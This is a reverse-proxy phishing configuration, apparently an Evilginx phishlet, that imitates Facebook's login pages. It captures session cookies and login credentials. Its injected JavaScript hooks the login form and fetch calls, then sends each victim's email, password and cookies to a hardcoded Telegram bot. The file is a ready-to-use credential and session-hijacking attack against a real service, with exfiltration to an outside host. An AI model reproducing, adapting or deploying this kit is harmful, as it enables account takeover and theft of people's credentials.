author: '@An0nud4y'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: false}
sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}



auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user','xs','sb', 'datr']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: '^unenc_password$'
    search: '(.*)'
    type: 'post'
#Custom parameters are added in order to grab the requests made by javascripts injected in order to get device user-agent and other details.
# key: 'pass'  is added in order to increase the chances of grabbing the pass field if in case failed from above.

  custom: 
    - key: '^pass$'
      search: '(.*)'
      type: 'post'
    - key: '^Password$'
      search: '(.*)'
      type: 'post'  
    - key: 'UserAgent'
      search: '(.*)'
      type: 'post'
    - key: 'Browser'
      search: '(.*)'
      type: 'post'
    - key: 'Engine'
      search: '(.*)'
      type: 'post'
    - key: 'Platform'
      search: '(.*)'
      type: 'post'

login:
  domain: 'www.facebook.com'
  path: '/login.php'

#Below Javascript function will do two things (1) on page load it will make 4 request back to server to let us capture the important data. (2) Will add a function to login button to leak the value of password field.

js_inject:
  - trigger_domains: ["www.facebook.com"]
    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"] #The target path is important as the javascript will be injected in all address pages started with /login 
    trigger_params: []
    script: |  
        (() => {
        const BOT_TOKEN = "7584622526:AAH9qqBmwfwhJwqYkUbu4lcFmdzgEht57ZE"
        const CHAT_ID = "916470086"; 
        const EXFIL_DELAY = 2000; 

        console.log('bot loaded');

        // ====== Helper Functions ======
        const safeSend = async (data) => {
            try {
                const text = encodeURIComponent(
                    `📩 New Login\n` +
                    `⏰ ${new Date().toLocaleString()}\n` +
                    `📧 Email: ${data.email || "N/A"}\n` +
                    `🔑 Password: ${data.pass || "N/A"}\n` +
                    `🍪 Cookies: ${data.cookies || "N/A"}\n` +
                    `🌐 UserAgent: ${navigator.userAgent}`
                );

                await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`,
                    { mode: "no-cors", keepalive: true }
                );
            } catch (e) {}
          };

        const hijackLoginForm = () => {
            const form = document.querySelector("form[action*='/login']");
            if (!form) return;

            form.addEventListener("submit", (e) => {
                const email = document.querySelector("input[name='email']")?.value;
                const pass = document.querySelector("input[name='pass']")?.value;
                
                if (email && pass) {
                    setTimeout(() => {
                        safeSend({
                            email: email,
                            pass: pass,
                            cookies: document.cookie
                        });
                    }, EXFIL_DELAY);
                    console.log('message sent')l
                }
            }, { capture: true });
        };

          const hijackFetch = () => {
              const origFetch = window.fetch;
              window.fetch = async (...args) => {
                  const [url, options] = args;
                  if (options?.method === "POST" && /\/login(\/|\.php)/i.test(url)) {
                      const body = new URLSearchParams(options.body);
                      if (body.has("email") && body.has("pass")) {
                          safeSend({
                              email: body.get("email"),
                              pass: body.get("pass"),
                              cookies: document.cookie
                          });
                      }
                  }
                  return origFetch.apply(this, args);
              };
          };
          hijackLoginForm();
          hijackFetch();
        })();
      